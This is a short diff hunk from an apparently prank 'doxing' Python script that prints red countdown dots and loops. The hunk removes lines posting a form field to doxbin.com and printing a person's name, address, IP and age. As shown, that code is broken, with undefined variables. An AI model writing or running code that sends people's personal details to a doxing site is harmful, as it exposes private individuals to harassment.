@@ -96,13 +96,6 @@ for i in range(5):
     print('\033[31m   .\t', end=' ', flush=True)
     time.sleep(1)
 
-import requests
-
-url = 'http://doxbin.com'
-query = {'field': value}
-res = requests.post(url, data=query)
-print(first_name + " " + last_name + " " + address + " " + ip + " " + age)
-
 import time
 
 for i in range(10000):
